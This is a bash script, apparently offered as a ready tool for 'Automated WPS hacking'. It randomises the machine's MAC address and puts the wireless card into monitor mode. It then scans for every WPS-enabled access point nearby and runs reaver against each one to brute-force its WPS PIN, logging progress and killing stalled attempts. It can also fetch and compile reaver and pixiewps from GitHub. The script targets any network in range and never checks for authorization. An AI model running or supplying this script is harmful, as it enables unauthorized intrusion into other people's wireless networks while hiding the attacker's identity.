#! /bin/bash

# The default wireless interface (usually wlan0, wifi0 or ath0)
wireless_interface=wlan0

# The timeout (in seconds) for wash to search for WPS-enabled access points
wash_timeout=30

# Delay between attack attempts
reaver_delay=0

# Max continuous WARNINGS
reaver_attemps=20

# Base config parameters to reaver
reaver_base="-a -f -w -vv"

e() {
    echo ""
    echo "$1"
    echo ""

    if [ "$2" != "" ]; then
        exit 1
    fi
}

getMac() {
    ifconfig -a | grep HWaddr | grep $wireless_interface | awk -F' ' '{print $5}'
}

washCmd() {
    wash_help="$(wash --help 2>&1)"

    wash_options="-i mon0"

    if [ "$(echo $wash_help | grep -- "ignore-fcs")" != '' ]; then
        wash_options=$wash_options" --ignore-fcs"
    fi

    timeout $wash_timeout wash $wash_options > $logs/wash.log 2>&1
}

resetInterface() {
    for interface in $(ifconfig | grep -o "^mon[0-9]\+"); do
        airmon-ng stop $interface > /dev/null
    done

    e "Generate Random MAC Address for $wireless_interface"

    ifconfig $wireless_interface down

    macchanger -a $wireless_interface

    airmon-ng start $wireless_interface > /dev/null 2>&1

    ifconfig mon0 down

    macchanger -m "$(getMac)" mon0 > /dev/null 2>&1

    ifconfig $wireless_interface up
    ifconfig mon0 up
}

killProcess() {
    ps aux | grep "$1 " | grep -v grep | awk -F' ' '{print $2}' | while read pid; do
        kill -9 $pid > /dev/null 2>&1
    done
}

if [ "$(whoami)" != "root" ]; then
    e "This script needs root" "true"
fi

here="$(pwd)"
logs="$here/logs"
tmp="$here/tmp"

if [ ! -d "$logs" ]; then
    mkdir "$logs"
fi

echo ""
echo "Automated WPS hacking"
echo "---------------------"
echo ""

read -p "Install reaver/wash new versions? [y/n] " install

if [ "$install" == "y" ]; then
    read -p "Install from github? [y = github / n = local] " install

    if [ ! -d $tmp ]; then
        mkdir $tmp
    fi

    if [ "$install" == "y" ]; then
        echo ""

        wget -nv https://github.com/wiire/pixiewps/archive/master.zip -O $tmp/pixiewps.zip
        wget -nv https://github.com/t6x/reaver-wps-fork-t6x/archive/master.zip -O $tmp/reaver-wps-fork-t6x.zip
    elif [ -f pixiewps.zip ] && [ -f reaver-wps-fork-t6x.zip ]; then
        cp reaver-wps-fork-t6x.zip pixiewps.zip $tmp/
    else
        e "Local zip packages unavailable" "true"
    fi

    e "Installing packages. Please wait... (check log $logs/install.log)"

    cd $tmp

    unzip -o -qq pixiewps.zip
    unzip -o -qq reaver-wps-fork-t6x.zip

    echo '' > $logs/install.log

    cd $tmp/pixiewps*/src &&\
        make >> $logs/install.log 2>&1 &&\
        make install >> $logs/install.log 2>&1

    cd $tmp/reaver-wps-fork-t6x*/src &&\
        ./configure >> $logs/install.log 2>&1 &&\
        make >> $logs/install.log 2>&1 &&\
        make install >> $logs/install.log 2>&1

    cd $here
fi

# Check for required commands
for command in airmon-ng wash reaver; do
    if [ "$(which $command 2> /dev/null)" == "" ]; then
        e "$command was not found" "true"
    fi
done

pixiewps="$(which pixiewps 2> /dev/null)"

resetInterface

e "Identifying WPS-enabled access points"

washCmd

e "Processing WPA-WPS list"

cat "$logs/wash.log" | grep "[A-Z0-9][A-Z0-9]:[A-Z0-9][A-Z0-9]:" | tr -s ' ' | while read line; do
    channel=$(echo $line | cut -f2 -d' ')
    mac=$(echo $line | cut -f1 -d' ')

    if [ "$mac" == "" ] || [ "$channel" == "" ]; then
        e "Invalid MAC ($mac) or channel ($channel) on line $line"
        continue
    fi

    resetInterface

    e "Starting reaver"

    echo "Line: $line"
    echo "Channel: $channel"
    echo "MAC Address: $mac"
    echo "Log: logs/$mac.log"

    reaver_options=$reaver_base" -i mon0 -c $channel -b $mac -m $(getMac) -d $reaver_delay"

    if [ "$(echo $line | grep Yes)" != "" ]; then
        reaver_options=$reaver_options" -L"
    fi

    if [ "$(echo $line | grep Realtek)" == "" ]; then
        reaver_options=$reaver_options" -S"
    fi

#    if [ "$pixiewps" != "" ]; then
#        reaver_options=$reaver_options" --pixie-dust=1"
#    fi

    e "Command: reaver $reaver_options"

    echo "Start at: $(date "+%Y-%m-%d %H:%M:%S")" > "$logs/$mac.log"

    reaver $reaver_options >> "$logs/$mac.log" 2>&1 &

    while [ true ]; do
        sleep 10

        if [ "$(ps -ef | grep 'reaver ' | grep -v grep)" == "" ]; then
            e "Finished" >> "$logs/$mac.log"
            break
        fi

	lines=$(($reaver_attemps * 2))

        if [ "$(tail -$lines "$logs/$mac.log" | grep "WARNING" | wc -l)" -gt $reaver_attemps ]; then
            e "Stopped (too many warnings)" >> "$logs/$mac.log"
            killProcess reaver
            break
        fi
    done

    echo "End at: $(date "+%Y-%m-%d %H:%M:%S")" >> "$logs/$mac.log"
done

exit 0
